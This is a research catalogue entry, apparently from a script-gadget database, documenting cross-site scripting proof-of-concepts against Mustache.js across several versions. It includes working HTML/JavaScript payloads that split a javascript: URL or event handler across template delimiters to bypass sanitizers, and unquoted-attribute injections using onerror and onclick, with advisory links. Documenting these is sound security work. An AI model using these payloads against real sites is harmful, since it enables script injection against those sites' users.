---
description: Minimal templating with {{mustaches}} in JavaScript
github: janl/mustache.js
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - a-tag
      - href-attr
      - any-attr
      - func-call-parameter
    pocs:
      - description: In the case of sanitized input, it may be possible to exploit the null replacement behavior in [Mustache.js](https://github.com/janl/mustache.js) templates to bypass the sanitizer when an invalid template is used.
        code: |
          <!-- user input -->
          <div id="template"><a href="java{{a" x="}}script:alert(document.domain)">Click Me</a></div>

          <script src="https://unpkg.com/mustache@latest"></script>
          <script>
            const template = document.getElementById("template").innerHTML;
            const rendered = Mustache.render(template, { name: "<h1>hello</h1>" });
            document.getElementById("template").innerHTML = rendered;
          </script>
      - description: The same behavior can be abused in case of 2 **raw** injection points.
        code: |
          <div id="template">
            <img src="[current-location]/<!-- user input 1 -->{{">
            <div>Random Text</div>
            <!-- user input 2 -->}}" onerror="alert(document.domain)">
            <div>Random Text</div>
          </div>

          <script src="https://unpkg.com/mustache@latest"></script>
          <script>
            const template = document.getElementById("template").innerHTML;
            const rendered = Mustache.render(template, { name: "<h1>hello</h1>" });
            document.getElementById("template").innerHTML = rendered;
          </script>
  ≤2.2.0:
    authors:
      - github:vikstrous
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [Mustache.js](https://github.com/janl/mustache.js) library did not prevent unquoted templated attribute values from adding arbitrary new attributes containing spaces.
        code: |
          <div id="template"></div>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/mustache.js/2.2.0/mustache.min.js"></script>
          <script>
            const rendered = Mustache.render(`<img src={{userinput}}>`, { userinput: "a onerror=alert(document.domain)" });
            document.getElementById("template").innerHTML = rendered;
          </script>
    links:
      - https://security.snyk.io/vuln/SNYK-DOTNET-MUSTACHE-60190
      - https://github.com/janl/mustache.js/commit/378bcca8a5cfe4058f294a3dbb78e8755e8e0da5
  ≤0.3.0:
    authors:
      - github:vikstrous
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - func-call-parameter
    pocs:
      - description: The [Mustache.js](https://github.com/janl/mustache.js) library wasn't properly handling replacements in attributes, allowing them to be escaped with a user-controlled value.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/mustache.js/0.3.0/mustache.min.js"></script>

          <script>
            document.write(Mustache.to_html(
              `<input value="{{val}}" />`, {
              // user input
              val: `maybe" onclick="alert(document.domain);" nothing="`
            }));
          </script>
    links:
      - https://security.snyk.io/vuln/SNYK-DOTNET-MUSTACHE-60189
      - https://github.com/janl/mustache.js/issues/112
---
